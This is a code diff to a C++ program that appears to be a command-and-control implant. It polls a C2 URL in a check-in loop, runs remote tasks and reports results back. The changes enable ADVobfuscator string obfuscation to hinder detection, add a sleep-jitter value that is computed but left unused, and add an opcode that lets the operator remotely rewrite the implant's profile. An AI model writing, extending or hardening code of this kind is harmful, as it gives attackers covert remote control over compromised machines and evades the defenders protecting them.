@@ -5,7 +5,7 @@
 #include <sodium.h>
 #include <string.h>
 #include <vector>
-// #include "obfuscator/MetaString.h"
+#include "obfuscator/MetaString.h"
 #include "rapidjson/rapidjson.h"
 #include "rapidjson/document.h"
 #include "rapidjson/stringbuffer.h"
@@ -22,7 +22,7 @@
 #include "handlers.h"
 
 using namespace std;
-// using namespace andrivet::ADVobfuscator;
+using namespace andrivet::ADVobfuscator;
 
 MalleableProfile *currentProfile;
 
@@ -65,6 +65,7 @@ int main()
 	// // Checkin loop
 	while (TRUE)
 	{
+		float sleeptime = currentProfile->sleep + (currentProfile->sleep * currentProfile->jitter);
 		// Sleep(currentProfile->sleep * 1000);
 		Sleep(5000);
 		Task *newTask = Checkin(C2_URL, currentProfile);
@@ -103,6 +104,11 @@ int main()
 				continue;
 			}
 			Sleep(numSeconds * 1000);
+			SendTaskResult(newTask->taskId.c_str(), C2_URL, "", true, currentProfile);
+		}
+		else if (opcode == OPCODE_UPDATE_CONFIG) {
+			rapidjson::Value* changes = newTask->args;
+			UpdateProfile(changes, currentProfile);
 			SendTaskResult(newTask->taskId.c_str(), C2_URL, "", true, currentProfile);
 		}
 	}
